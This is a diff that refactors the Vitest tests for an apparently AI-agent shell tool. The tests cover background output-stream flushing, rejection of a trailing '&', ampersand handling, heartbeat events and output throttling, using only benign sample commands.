         expect(registry.complete).not.toHaveBeenCalled();
 
         deferred.emit('error');
-        expect(registry.complete).toHaveBeenCalledTimes(1);
-        expect(registry.complete).toHaveBeenCalledWith(
-          shellId,
-          0,
-          expect.any(Number),
-        );
+        expectCompletedOnce(shellId);
       });
 
       it('transitions after the flush timeout when the stream never settles', async () => {
-        // Wedged fd whose 'finish'/'error' never fire (e.g. stuck
-        // mid-flush on an unresponsive filesystem): the 10s timer is
-        // the backstop. Fake only the timer functions so the
-        // setImmediate-based microtask flush in the helper stays real.
-        vi.useFakeTimers({ toFake: ['setTimeout', 'clearTimeout'] });
-        try {
-          const registry = mockConfig.getBackgroundShellRegistry();
-          const deferred = makeDeferredStream();
-          const { shellId } = await startBackgroundAndExit(deferred);
-          expect(registry.complete).not.toHaveBeenCalled();
+        // A wedged fd (stuck mid-flush on an unresponsive filesystem) never
+        // fires 'finish'/'error'; the 10s timer is the backstop. Only timer
+        // functions are faked so the helper's setImmediate flush stays real.
+        fakeTimers({ toFake: ['setTimeout', 'clearTimeout'] });
+        const deferred = makeDeferredStream();
+        const { shellId } = await startBackgroundAndExit(deferred);
+        expect(registry.complete).not.toHaveBeenCalled();
 
-          await vi.advanceTimersByTimeAsync(10_000);
-          expect(registry.complete).toHaveBeenCalledTimes(1);
-          expect(registry.complete).toHaveBeenCalledWith(
-            shellId,
-            0,
-            expect.any(Number),
-          );
+        await vi.advanceTimersByTimeAsync(10_000);
+        expectCompletedOnce(shellId);
 
-          // The finish landing after the timeout must not double-fire.
-          deferred.emit('finish');
-          expect(registry.complete).toHaveBeenCalledTimes(1);
-        } finally {
-          vi.useRealTimers();
-        }
+        // The finish landing after the timeout must not double-fire.
+        deferred.emit('finish');
+        expect(registry.complete).toHaveBeenCalledTimes(1);
       });
 
       it('settles immediately when the stream was already destroyed by a write error', async () => {
-        // fs.WriteStream has autoDestroy — an earlier EIO/ENOSPC write
-        // error destroys the stream long before the child exits. On a
-        // destroyed writable `.end()` is a silent no-op and neither
-        // 'finish' nor 'error' will ever fire, so waiting would stall
-        // the transition (and every /tasks or sidecar reader) for the
-        // full flush timeout with nothing left to flush.
-        const registry = mockConfig.getBackgroundShellRegistry();
+        // autoDestroy: an earlier EIO/ENOSPC write error destroyed the stream;
+        // `.end()` is a silent no-op and no event fires, so waiting would stall
+        // the transition (and /tasks, sidecar readers) for the full timeout.
         const deferred = { ...makeDeferredStream(), destroyed: true };
         const { shellId } = await startBackgroundAndExit(deferred, {
           expectFlushRequested: false,
         });
 
-        expect(registry.complete).toHaveBeenCalledTimes(1);
-        expect(registry.complete).toHaveBeenCalledWith(
-          shellId,
-          0,
-          expect.any(Number),
-        );
+        expectCompletedOnce(shellId);
         // The dead stream is not asked to flush at all.
         expect(deferred.end).not.toHaveBeenCalled();
       });
 
       it('settles immediately when the stream has already finished flushing', async () => {
-        // writableFinished means every byte reached the fd and 'finish'
-        // already fired — nothing left to wait for. (The guard must NOT
-        // use writableEnded: that flag is already true mid-flush, which
-        // is exactly the window these tests exist to protect.)
-        const registry = mockConfig.getBackgroundShellRegistry();
+        // writableFinished: every byte reached the fd and 'finish' already
+        // fired. (Not writableEnded: that is already true mid-flush, the very
+        // window these tests protect.)
         const deferred = { ...makeDeferredStream(), writableFinished: true };
         const { shellId } = await startBackgroundAndExit(deferred, {
           expectFlushRequested: false,
         });
 
-        expect(registry.complete).toHaveBeenCalledTimes(1);
-        expect(registry.complete).toHaveBeenCalledWith(
-          shellId,
-          0,
-          expect.any(Number),
-        );
+        expectCompletedOnce(shellId);
         expect(deferred.end).not.toHaveBeenCalled();
       });
 
       it('still waits when the stream has ended but not yet finished flushing', async () => {
-        // writableEnded flips true the moment `.end()` is called while
-        // bytes can still sit in the libuv queue — writableFinished
-        // only turns true with 'finish'. The short-circuit must NOT
-        // fire in this state: settling here is exactly the truncation
-        // window the flush wait exists to prevent.
-        const registry = mockConfig.getBackgroundShellRegistry();
+        // writableEnded flips on `.end()` while bytes can still sit in the
+        // libuv queue; settling here is exactly the truncation window.
         const deferred = {
           ...makeDeferredStream(),
           writableEnded: true,
@@ -2196,358 +1986,146 @@ describe('ShellTool', () => {
 
         // …until the flush actually completes.
         deferred.emit('finish');
-        expect(registry.complete).toHaveBeenCalledTimes(1);
-        expect(registry.complete).toHaveBeenCalledWith(
-          shellId,
-          0,
-          expect.any(Number),
-        );
+        expectCompletedOnce(shellId);
       });
 
       it('disarms the flush timer when stream.end() throws synchronously', async () => {
-        // The catch path settles immediately — but it must also clear
-        // the already-armed timer, or 10s later it fires and logs a
-        // misleading flush-timeout warning for a shell that settled
-        // long ago.
-        vi.useFakeTimers({ toFake: ['setTimeout', 'clearTimeout'] });
-        try {
-          const registry = mockConfig.getBackgroundShellRegistry();
-          const deferred = makeDeferredStream();
-          deferred.end.mockImplementation(() => {
-            throw new Error('EBADF: bad file descriptor, close');
-          });
-          const { shellId } = await startBackgroundAndExit(deferred);
+        // The catch path settles immediately but must also clear the armed
+        // timer, or 10s later it logs a misleading flush-timeout warning.
+        fakeTimers({ toFake: ['setTimeout', 'clearTimeout'] });
+        const deferred = makeDeferredStream();
+        deferred.end.mockImplementation(() => {
+          throw new Error('EBADF: bad file descriptor, close');
+        });
+        const { shellId } = await startBackgroundAndExit(deferred);
 
-          // Settled via the catch path, immediately.
-          expect(registry.complete).toHaveBeenCalledTimes(1);
-          expect(registry.complete).toHaveBeenCalledWith(
-            shellId,
-            0,
-            expect.any(Number),
-          );
-          expect(mockDebugLogger.warn).toHaveBeenCalledWith(
-            expect.stringContaining('closing output stream on settle threw'),
-          );
+        // Settled via the catch path, immediately.
+        expectCompletedOnce(shellId);
+        expect(mockDebugLogger.warn).toHaveBeenCalledWith(
+          expect.stringContaining('closing output stream on settle threw'),
+        );
 
-          // The timer must be gone: advancing past the timeout fires
-          // nothing and logs nothing.
-          await vi.advanceTimersByTimeAsync(10_000);
-          expect(registry.complete).toHaveBeenCalledTimes(1);
-          expect(mockDebugLogger.warn).not.toHaveBeenCalledWith(
-            expect.stringContaining('flush timed out'),
-          );
-        } finally {
-          vi.useRealTimers();
-        }
+        // The timer is gone: advancing past the timeout fires and logs nothing.
+        await vi.advanceTimersByTimeAsync(10_000);
+        expect(registry.complete).toHaveBeenCalledTimes(1);
+        expect(mockDebugLogger.warn).not.toHaveBeenCalledWith(
+          expect.stringContaining('flush timed out'),
+        );
       });
     });
 
-    it('rejects a bare trailing & in managed background mode', async () => {
-      expect(() =>
-        shellTool.build({
-          command: 'node server.js &',
-          is_background: true,
-        }),
-      ).toThrow(
-        'Background shell commands must not end with a bare "&". Remove the trailing "&" and rely on is_background: true instead.',
-      );
-      expect(mockShellExecutionService).not.toHaveBeenCalled();
-    });
-
-    it('rejects wrapped bash commands whose stripped payload ends with bare &', async () => {
-      expect(() =>
-        shellTool.build({
-          command: 'bash -c "node server.js &"',
-          is_background: true,
-        }),
-      ).toThrow(
-        'Background shell commands must not end with a bare "&". Remove the trailing "&" and rely on is_background: true instead.',
-      );
-      expect(mockShellExecutionService).not.toHaveBeenCalled();
-    });
-
-    it('rejects wrapped sh commands whose stripped payload ends with bare &', async () => {
-      expect(() =>
-        shellTool.build({
-          command: "sh -c 'npm run dev &'",
-          is_background: true,
-        }),
-      ).toThrow(
+    it.each([
+      [
+        'rejects a bare trailing & in managed background mode',
+        'node server.js &',
+      ],
+      [
+        'rejects wrapped bash commands whose stripped payload ends with bare &',
+        'bash -c "node server.js &"',
+      ],
+      [
+        'rejects wrapped sh commands whose stripped payload ends with bare &',
+        "sh -c 'npm run dev &'",
+      ],
+    ])('%s', async (_title, command) => {
+      expect(() => build(command, { is_background: true })).toThrow(
         'Background shell commands must not end with a bare "&". Remove the trailing "&" and rely on is_background: true instead.',
       );
       expect(mockShellExecutionService).not.toHaveBeenCalled();
     });
 
     it('keeps pre-existing comment trimming behavior for managed background validation', async () => {
-      const invocation = shellTool.build({
-        command: 'echo ok # note\nsleep 5 &',
+      const invocation = build('echo ok # note\nsleep 5 &', {
         is_background: true,
       });
 
       expect(invocation).toBeDefined();
     });
 
-    it('preserves a trailing && (logical AND would be syntactically broken otherwise)', async () => {
-      const invocation = shellTool.build({
-        command: 'npm run dev &&',
-        is_background: true,
-      });
-      await invocation.execute(mockAbortSignal);
-      expect(mockShellExecutionService).toHaveBeenCalledWith(
+    it.each([
+      [
+        'preserves a trailing && (logical AND would be syntactically broken otherwise)',
         'npm run dev &&',
-        expect.any(String),
-        expect.any(Function),
-        expect.any(AbortSignal),
-        false,
-        expect.objectContaining({}),
-        { streamStdout: true },
-      );
-    });
-
-    it('preserves an escaped trailing \\& (literal &)', async () => {
-      const invocation = shellTool.build({
-        command: 'echo foo \\&',
-        is_background: true,
-      });
-      await invocation.execute(mockAbortSignal);
-      expect(mockShellExecutionService).toHaveBeenCalledWith(
-        'echo foo \\&',
-        expect.any(String),
-        expect.any(Function),
-        expect.any(AbortSignal),
-        false,
-        expect.objectContaining({}),
-        { streamStdout: true },
-      );
-    });
-
-    it('preserves quoted trailing ampersands', async () => {
-      const invocation = shellTool.build({
-        command: `printf '&'`,
-        is_background: true,
-      });
-      await invocation.execute(mockAbortSignal);
-      expect(mockShellExecutionService).toHaveBeenCalledWith(
-        `printf '&'`,
-        expect.any(String),
-        expect.any(Function),
-        expect.any(AbortSignal),
-        false,
-        expect.objectContaining({}),
-        { streamStdout: true },
-      );
-    });
-
-    it('preserves ampersands inside double-quoted script arguments', async () => {
-      const invocation = shellTool.build({
-        command: `node -e "console.log('&')"`,
-        is_background: true,
-      });
-      await invocation.execute(mockAbortSignal);
-      expect(mockShellExecutionService).toHaveBeenCalledWith(
+      ],
+      ['preserves an escaped trailing \\& (literal &)', 'echo foo \\&'],
+      ['preserves quoted trailing ampersands', `printf '&'`],
+      [
+        'preserves ampersands inside double-quoted script arguments',
         `node -e "console.log('&')"`,
-        expect.any(String),
-        expect.any(Function),
-        expect.any(AbortSignal),
-        false,
-        expect.objectContaining({}),
-        { streamStdout: true },
-      );
-    });
-
-    it('preserves ampersands inside command substitutions', async () => {
-      const invocation = shellTool.build({
-        command: `echo $(printf '&')`,
-        is_background: true,
-      });
-      await invocation.execute(mockAbortSignal);
-      expect(mockShellExecutionService).toHaveBeenCalledWith(
+      ],
+      [
+        'preserves ampersands inside command substitutions',
         `echo $(printf '&')`,
-        expect.any(String),
-        expect.any(Function),
-        expect.any(AbortSignal),
-        false,
-        expect.objectContaining({}),
-        { streamStdout: true },
-      );
+      ],
+      [
+        'preserves shell wrapper environment and flags during background execution',
+        `FOO=bar bash -e -c 'echo "$FOO"; sleep 10'`,
+      ],
+    ])('%s', async (_title, command) => {
+      await runBg(command);
+      expectSpawned(command, { background: true });
     });
 
     it('does not forward the turn signal into the background shell', async () => {
-      // Verifies: the AbortSignal handed to ShellExecutionService is the
-      // entry's own controller, not the outer turn signal. Cancelling the
-      // turn must not kill an intentionally backgrounded dev server / watcher.
+      // Cancelling the turn must not kill an intentionally backgrounded dev
+      // server / watcher: the service gets the entry's own controller.
       const turnAc = new AbortController();
-      const invocation = shellTool.build({
-        command: 'npm run dev',
-        is_background: true,
-      });
-      await invocation.execute(turnAc.signal);
+      await build('npm run dev', { is_background: true }).execute(
+        turnAc.signal,
+      );
       const passedSignal = mockShellExecutionService.mock.calls[0][3];
       expect(passedSignal).not.toBe(turnAc.signal);
       turnAc.abort();
-      // The signal handed to ShellExecutionService stays un-aborted —
-      // the turn's abort doesn't propagate into the background shell.
       expect(passedSignal.aborted).toBe(false);
     });
 
     it('should not add ampersand when is_background is false', async () => {
-      const invocation = shellTool.build({
-        command: 'npm test',
-        is_background: false,
-      });
-      const promise = invocation.execute(mockAbortSignal);
-      resolveShellExecution({ pid: 54321 });
-
-      await promise;
+      await runFg('npm test', { pid: 54321 });
 
       // Foreground commands should not be wrapped with pgrep
-      expect(mockShellExecutionService).toHaveBeenCalledWith(
-        'npm test',
-        expect.any(String),
-        expect.any(Function),
-        expect.any(AbortSignal),
-        false,
-        expect.objectContaining({}),
-
-        expect.objectContaining({ postPromote: expect.any(Object) }),
-      );
+      expectSpawned('npm test');
     });
 
     it('preserves shell wrapper environment and flags during foreground execution', async () => {
       const command = `FOO=bar bash -e -c 'echo "$FOO"; false; echo bad'`;
-      const invocation = shellTool.build({
-        command,
-        is_background: false,
-      });
-      const promise = invocation.execute(mockAbortSignal);
-      resolveShellExecution();
+      await runFg(command);
 
-      await promise;
-
-      expect(mockShellExecutionService).toHaveBeenCalledWith(
-        command,
-        expect.any(String),
-        expect.any(Function),
-        expect.any(AbortSignal),
-        false,
-        expect.objectContaining({}),
-
-        expect.objectContaining({ postPromote: expect.any(Object) }),
-      );
-    });
-
-    it('preserves shell wrapper environment and flags during background execution', async () => {
-      const command = `FOO=bar bash -e -c 'echo "$FOO"; sleep 10'`;
-      const invocation = shellTool.build({
-        command,
-        is_background: true,
-      });
-
-      await invocation.execute(mockAbortSignal);
-
-      expect(mockShellExecutionService).toHaveBeenCalledWith(
-        command,
-        expect.any(String),
-        expect.any(Function),
-        expect.any(AbortSignal),
-        false,
-        expect.objectContaining({}),
-        { streamStdout: true },
-      );
+      expectSpawned(command);
     });
 
     it('should use the provided directory as cwd', async () => {
       (mockConfig.getWorkspaceContext as Mock).mockReturnValue(
         createMockWorkspaceContext('/test/dir'),
       );
-      const invocation = shellTool.build({
-        command: 'ls',
-        directory: '/test/dir/subdir',
-        is_background: false,
-      });
-      const promise = invocation.execute(mockAbortSignal);
-      resolveShellExecution();
-      await promise;
+      await runFg('ls', {}, { directory: '/test/dir/subdir' });
 
       // Foreground commands should not be wrapped with pgrep
-      expect(mockShellExecutionService).toHaveBeenCalledWith(
-        'ls',
-        '/test/dir/subdir',
-        expect.any(Function),
-        expect.any(AbortSignal),
-        false,
-        expect.objectContaining({}),
-
-        expect.objectContaining({ postPromote: expect.any(Object) }),
-      );
+      expectSpawned('ls', { cwd: '/test/dir/subdir' });
     });
 
     it('should not wrap command on windows', async () => {
       vi.mocked(os.platform).mockReturnValue('win32');
-      const invocation = shellTool.build({
-        command: 'dir',
-        is_background: false,
-      });
-      const promise = invocation.execute(mockAbortSignal);
-      resolveShellExecution({
-        rawOutput: Buffer.from(''),
-        output: '',
-        exitCode: 0,
-        signal: null,
-        error: null,
-        aborted: false,
-        pid: 12345,
-        executionMethod: 'child_process',
-      });
-      await promise;
-      expect(mockShellExecutionService).toHaveBeenCalledWith(
-        'dir',
-        '/test/dir',
-        expect.any(Function),
-        expect.any(AbortSignal),
-        false,
-        expect.objectContaining({}),
-
-        expect.objectContaining({ postPromote: expect.any(Object) }),
-      );
+      await runFg('dir', { output: '' });
+      expectSpawned('dir', { cwd: '/test/dir' });
     });
 
     it('should format error messages correctly', async () => {
       const error = new Error('wrapped command failed');
-      const invocation = shellTool.build({
-        command: 'user-command',
-        is_background: false,
-      });
-      const promise = invocation.execute(mockAbortSignal);
-      resolveShellExecution({
+      const result = await runFg('user-command', {
         error,
         exitCode: 1,
         output: 'err',
-        rawOutput: Buffer.from('err'),
-        signal: null,
-        aborted: false,
-        pid: 12345,
-        executionMethod: 'child_process',
       });
-
-      const result = await promise;
-      expect(result.llmContent).toContain('Error: wrapped command failed');
-      expect(result.llmContent).not.toContain('pgrep');
+      expectText(
+        result.llmContent,
+        ['Error: wrapped command failed'],
+        ['pgrep'],
+      );
     });
 
     it('should return a SHELL_EXECUTE_ERROR for a command failure', async () => {
       const error = new Error('command failed');
-      const invocation = shellTool.build({
-        command: 'user-command',
-        is_background: false,
-      });
-      const promise = invocation.execute(mockAbortSignal);
-      resolveShellExecution({
-        error,
-        exitCode: 1,
-      });
-
-      const result = await promise;
+      const result = await runFg('user-command', { error, exitCode: 1 });
 
       expect(result.error).toBeDefined();
       expect(result.error?.type).toBe(ToolErrorType.SHELL_EXECUTE_ERROR);
@@ -2555,19 +2133,13 @@ describe('ShellTool', () => {
     });
 
     it('should throw an error for invalid parameters', async () => {
-      expect(() =>
-        shellTool.build({ command: '', is_background: false }),
-      ).toThrow('Command cannot be empty.');
+      expect(() => build('')).toThrow('Command cannot be empty.');
     });
 
     it('should throw an error for invalid directory', async () => {
-      expect(() =>
-        shellTool.build({
-          command: 'ls',
-          directory: 'nonexistent',
-          is_background: false,
-        }),
-      ).toThrow('Directory must be an absolute path.');
+      expect(() => build('ls', { directory: 'nonexistent' })).toThrow(
+        'Directory must be an absolute path.',
+      );
     });
 
     describe('Silent-command heartbeat', () => {
@@ -2589,6 +2161,9 @@ describe('ShellTool', () => {
         vi.useRealTimers();
       });
 
+      const start = (command: string, params: Partial<ShellToolParams> = {}) =>
+        build(command, params).execute(mockAbortSignal, updateOutputMock);
+
       const heartbeats = () =>
         updateOutputMock.mock.calls
           .map(([arg]) => arg)
@@ -2599,25 +2174,8 @@ describe('ShellTool', () => {
               (arg as { type?: string }).type === 'shell_progress',
           );
 
-      const settle = async () => {
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-      };
-
       it('emits a heartbeat per silent interval with elapsed and effective timeout', async () => {
-        const invocation = shellTool.build({
-          command: 'quiet-soak-test',
-          is_background: false,
-        });
-        const promise = invocation.execute(mockAbortSignal, updateOutputMock);
+        const promise = start('quiet-soak-test');
         // Let execute() reach the post-spawn heartbeat setup.
         await vi.advanceTimersByTimeAsync(0);
 
@@ -2638,16 +2196,11 @@ describe('ShellTool', () => {
         expect(first).not.toHaveProperty('totalBytes');
         expect(second['elapsedMs']).toBe(20_000);
 
-        await settle();
-        await promise;
+        await settle(promise);
       });
 
       it('stays silent while output keeps the display fresh', async () => {
-        const invocation = shellTool.build({
-          command: 'npm test',
-          is_background: false,
-        });
-        const promise = invocation.execute(mockAbortSignal, updateOutputMock);
+        const promise = start('npm test');
         await vi.advanceTimersByTimeAsync(0);
 
         for (let i = 0; i < 4; i++) {
@@ -2657,16 +2210,11 @@ describe('ShellTool', () => {
 
         expect(heartbeats()).toHaveLength(0);
 
-        await settle();
-        await promise;
+        await settle(promise);
       });
 
       it('reports lastOutputAgeMs once output has been seen', async () => {
-        const invocation = shellTool.build({
-          command: 'npm test',
-          is_background: false,
-        });
-        const promise = invocation.execute(mockAbortSignal, updateOutputMock);
+        const promise = start('npm test');
         await vi.advanceTimersByTimeAsync(0);
 
         mockShellOutputCallback({ type: 'data', chunk: 'starting...' });
@@ -2676,48 +2224,33 @@ describe('ShellTool', () => {
         expect(beats.length).toBeGreaterThan(0);
         expect(beats.at(-1)!['lastOutputAgeMs']).toBe(20_000);
 
-        await settle();
-        await promise;
+        await settle(promise);
       });
 
       it('is disabled by heartbeatIntervalMs: 0', async () => {
         (mockConfig.getShellHeartbeatIntervalMs as Mock).mockReturnValue(0);
-        const invocation = shellTool.build({
-          command: 'quiet-soak-test',
-          is_background: false,
-        });
-        const promise = invocation.execute(mockAbortSignal, updateOutputMock);
+        const promise = start('quiet-soak-test');
         await vi.advanceTimersByTimeAsync(30_000);
 
         expect(heartbeats()).toHaveLength(0);
 
-        await settle();
-        await promise;
+        await settle(promise);
       });
 
       it('honours a configured interval', async () => {
         (mockConfig.getShellHeartbeatIntervalMs as Mock).mockReturnValue(5_000);
-        const invocation = shellTool.build({
-          command: 'quiet-soak-test',
-          is_background: false,
-        });
-        const promise = invocation.execute(mockAbortSignal, updateOutputMock);
+        const promise = start('quiet-soak-test');
         await vi.advanceTimersByTimeAsync(0);
 
         await vi.advanceTimersByTimeAsync(5_000);
         expect(heartbeats()).toHaveLength(1);
 
-        await settle();
-        await promise;
+        await settle(promise);
       });
 
       it('stops on abort before the process settles', async () => {
         const abortController = new AbortController();
-        const invocation = shellTool.build({
-          command: 'quiet-soak-test',
-          is_background: false,
-        });
-        const promise = invocation.execute(
+        const promise = build('quiet-soak-test').execute(
           abortController.signal,
           updateOutputMock,
         );
@@ -2728,58 +2261,25 @@ describe('ShellTool', () => {
         await vi.advanceTimersByTimeAsync(30_000);
         expect(heartbeats()).toHaveLength(1);
 
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: null,
-          signal: 15,
-          error: null,
-          aborted: true,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-        await promise;
+        await settle(promise, { exitCode: null, signal: 15, aborted: true });
       });
 
       it('stops once the command settles', async () => {
-        const invocation = shellTool.build({
-          command: 'quiet-soak-test',
-          is_background: false,
-        });
-        const promise = invocation.execute(mockAbortSignal, updateOutputMock);
+        const promise = start('quiet-soak-test');
         await vi.advanceTimersByTimeAsync(10_000);
         expect(heartbeats()).toHaveLength(1);
 
-        await settle();
-        await promise;
+        await settle(promise);
 
         await vi.advanceTimersByTimeAsync(30_000);
         expect(heartbeats()).toHaveLength(1);
       });
 
       it('carries output stats on the AnsiOutput path', async () => {
-        const invocation = shellTool.build({
-          command: 'ansi-soak-test',
-          is_background: false,
-        });
-        const promise = invocation.execute(mockAbortSignal, updateOutputMock);
+        const promise = start('ansi-soak-test');
         await vi.advanceTimersByTimeAsync(0);
 
-        const ansiChunk: import('../utils/terminalSerializer.js').AnsiOutput = [
-          [
-            {
-              text: 'hello',
-              bold: false,
-              italic: false,
-              dim: false,
-              underline: false,
-              inverse: false,
-              fg: '',
-              bg: '',
-            },
-          ],
-        ];
-        mockShellOutputCallback({ type: 'data', chunk: ansiChunk });
+        mockShellOutputCallback({ type: 'data', chunk: ansiChunk('hello') });
         await vi.advanceTimersByTimeAsync(20_000);
 
         const beats = heartbeats() as Array<Record<string, unknown>>;
@@ -2789,8 +2289,7 @@ describe('ShellTool', () => {
           totalBytes: 5,
         });
 
-        await settle();
-        await promise;
+        await settle(promise);
       });
     });
 
@@ -2804,12 +2303,55 @@ describe('ShellTool', () => {
         vi.useRealTimers();
       });
 
+      const start = (command: string, params: Partial<ShellToolParams> = {}) =>
+        build(command, params).execute(mockAbortSignal, updateOutputMock);
+
+      /** Starts a 20s-timeout foreground run wired for Ctrl+B promotion. */
+      const startPromotable = (
+        command: string,
+        setPromoteAc: Mock,
+        canPromote: () => boolean,
+        signal = mockAbortSignal,
+      ) =>
+        (build(command, { timeout: 20_000 }) as ShellToolInvocation).execute(
+          signal,
+          updateOutputMock,
+          undefined,
+          undefined,
+          setPromoteAc,
+          canPromote,
+        );
+
+      /** startPromotable, asserting the promote controller is handed out a tick later. */
+      const startArmed = async (
+        command: string,
+        canPromote: () => boolean = () => true,
+      ) => {
+        const setPromoteAbortController = vi.fn();
+        const promise = startPromotable(
+          command,
+          setPromoteAbortController,
+          canPromote,
+        );
+        await Promise.resolve();
+        expect(setPromoteAbortController).toHaveBeenCalledOnce();
+        return { promise };
+      };
+
+      /** Asserts the update count and, with `last`, the latest update. */
+      const expectUpdates = (times: number, last?: unknown) => {
+        expect(updateOutputMock).toHaveBeenCalledTimes(times);
+        if (last !== undefined) {
+          expect(updateOutputMock).toHaveBeenLastCalledWith(last);
+        }
+      };
+
+      /** Emits a data chunk. */
+      const emit = (chunk: string | AnsiOutput) =>
+        mockShellOutputCallback({ type: 'data', chunk });
+
       it('should immediately show binary detection message and throttle progress', async () => {
-        const invocation = shellTool.build({
-          command: 'cat img',
-          is_background: false,
-        });
-        const promise = invocation.execute(mockAbortSignal, updateOutputMock);
+        const promise = start('cat img');
 
         mockShellOutputCallback({ type: 'binary_detected' });
         expect(updateOutputMock).toHaveBeenCalledOnce();
@@ -2817,305 +2359,156 @@ describe('ShellTool', () => {
           '[Binary output detected. Halting stream...]',
         );
 
-        mockShellOutputCallback({
-          type: 'binary_progress',
-          bytesReceived: 1024,
-        });
+        const progress = (bytesReceived: number) =>
+          mockShellOutputCallback({ type: 'binary_progress', bytesReceived });
+        progress(1024);
         expect(updateOutputMock).toHaveBeenCalledOnce();
 
-        // Advance time past the throttle interval.
+        // Past the throttle interval, a SECOND progress event flushes the latest.
         await vi.advanceTimersByTimeAsync(OUTPUT_UPDATE_INTERVAL_MS + 1);
+        progress(2048);
+        expectUpdates(2, '[Receiving binary output... 2.0 KB received]');
 
-        // Send a SECOND progress event. This one will trigger the flush.
-        mockShellOutputCallback({
-          type: 'binary_progress',
-          bytesReceived: 2048,
-        });
-
-        // Now it should be called a second time with the latest progress.
-        expect(updateOutputMock).toHaveBeenCalledTimes(2);
-        expect(updateOutputMock).toHaveBeenLastCalledWith(
-          '[Receiving binary output... 2.0 KB received]',
-        );
-
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-        await promise;
+        await settle(promise);
       });
 
       it('should throttle live text updates while preserving the latest output', async () => {
-        const invocation = shellTool.build({
-          command: 'npm test',
-          is_background: false,
-        });
-        const promise = invocation.execute(mockAbortSignal, updateOutputMock);
+        const promise = start('npm test');
 
-        // Leading-edge fires immediately
-        mockShellOutputCallback({ type: 'data', chunk: 'line 1' });
+        // Leading edge fires immediately; the next chunk is suppressed.
+        emit('line 1');
         expect(updateOutputMock).toHaveBeenCalledOnce();
         expect(updateOutputMock).toHaveBeenLastCalledWith('line 1');
-
-        // Suppressed: trailing flush scheduled
-        mockShellOutputCallback({ type: 'data', chunk: 'line 2' });
+        emit('line 2');
         expect(updateOutputMock).toHaveBeenCalledOnce();
 
-        // Advance time: trailing flush fires, emitting 'line 2'
+        // The trailing flush emits 'line 2'.
         await vi.advanceTimersByTimeAsync(OUTPUT_UPDATE_INTERVAL_MS + 1);
-        expect(updateOutputMock).toHaveBeenCalledTimes(2);
-        expect(updateOutputMock).toHaveBeenLastCalledWith('line 2');
+        expectUpdates(2, 'line 2');
 
-        // Advance time past the interval window again so next chunk fires immediately
+        // Past the window again, the next chunk fires immediately.
         await vi.advanceTimersByTimeAsync(OUTPUT_UPDATE_INTERVAL_MS + 1);
+        emit('line 3');
+        expectUpdates(3, 'line 3');
 
-        mockShellOutputCallback({ type: 'data', chunk: 'line 3' });
-        expect(updateOutputMock).toHaveBeenCalledTimes(3);
-        expect(updateOutputMock).toHaveBeenLastCalledWith('line 3');
-
-        resolveExecutionPromise({
-          rawOutput: Buffer.from('line 1\nline 2\nline 3'),
-          output: 'line 1\nline 2\nline 3',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-        await promise;
+        await settle(promise, { output: 'line 1\nline 2\nline 3' });
       });
 
       it('should flush the last suppressed text chunk when the command goes quiet', async () => {
-        const invocation = shellTool.build({
-          command: 'long-running-cmd',
-          is_background: false,
-        });
-        const promise = invocation.execute(mockAbortSignal, updateOutputMock);
+        const promise = start('long-running-cmd');
 
-        // Leading-edge update
-        mockShellOutputCallback({ type: 'data', chunk: 'progress: 0%' });
+        // Leading edge, then a chunk suppressed within the throttle window.
+        emit('progress: 0%');
+        expect(updateOutputMock).toHaveBeenCalledOnce();
+        emit('progress: 50%');
         expect(updateOutputMock).toHaveBeenCalledOnce();
 
-        // Suppressed: within the throttle window
-        mockShellOutputCallback({ type: 'data', chunk: 'progress: 50%' });
-        expect(updateOutputMock).toHaveBeenCalledOnce();
-
-        // Advance time to trigger the trailing flush timer
+        // The trailing flush fires with the latest suppressed chunk.
         await vi.advanceTimersByTimeAsync(OUTPUT_UPDATE_INTERVAL_MS + 1);
+        expectUpdates(2, 'progress: 50%');
 
-        // The trailing flush must have fired with the latest suppressed chunk
-        expect(updateOutputMock).toHaveBeenCalledTimes(2);
-        expect(updateOutputMock).toHaveBeenLastCalledWith('progress: 50%');
-
-        resolveExecutionPromise({
-          rawOutput: Buffer.from('progress: 50%'),
-          output: 'progress: 50%',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-        await promise;
+        await settle(promise, { output: 'progress: 50%' });
       });
 
       it('should coalesce 3+ rapid text chunks within a window into a single trailing flush', async () => {
-        // Regression: in one throttle window, the leading-edge chunk fires
-        // immediately, and any subsequent chunks (regardless of count) are
-        // collapsed into ONE trailing flush carrying the latest text. The
-        // timer must not be repeatedly rescheduled per chunk — that would
-        // be wasteful and (depending on the math) could push the flush
-        // beyond the original window.
-        const invocation = shellTool.build({
-          command: 'streaming-cmd',
-          is_background: false,
-        });
-        const promise = invocation.execute(mockAbortSignal, updateOutputMock);
+        // Regression: after the leading edge, any number of chunks in a window
+        // collapse into ONE trailing flush of the latest text; rescheduling per
+        // chunk is wasteful and could push the flush past the original window.
+        const promise = start('streaming-cmd');
 
-        // Leading edge: fires immediately at t=0
-        mockShellOutputCallback({ type: 'data', chunk: 'chunk 1' });
+        emit('chunk 1');
         expect(updateOutputMock).toHaveBeenCalledOnce();
         expect(updateOutputMock).toHaveBeenLastCalledWith('chunk 1');
 
-        // Three rapid suppressed chunks within the same window. None of
-        // these should fire updateOutput synchronously, and the trailing
-        // flush should not have run yet.
+        // Three rapid chunks: none fires synchronously, nor the flush yet.
         await vi.advanceTimersByTimeAsync(50);
-        mockShellOutputCallback({ type: 'data', chunk: 'chunk 2' });
+        emit('chunk 2');
         await vi.advanceTimersByTimeAsync(50);
-        mockShellOutputCallback({ type: 'data', chunk: 'chunk 3' });
+        emit('chunk 3');
         await vi.advanceTimersByTimeAsync(50);
-        mockShellOutputCallback({ type: 'data', chunk: 'chunk 4' });
+        emit('chunk 4');
         expect(updateOutputMock).toHaveBeenCalledOnce();
 
-        // Drain the throttle window. The single trailing flush should
-        // fire exactly once and carry the LATEST suppressed chunk.
+        // The single trailing flush fires once with the LATEST chunk.
         await vi.advanceTimersByTimeAsync(OUTPUT_UPDATE_INTERVAL_MS + 1);
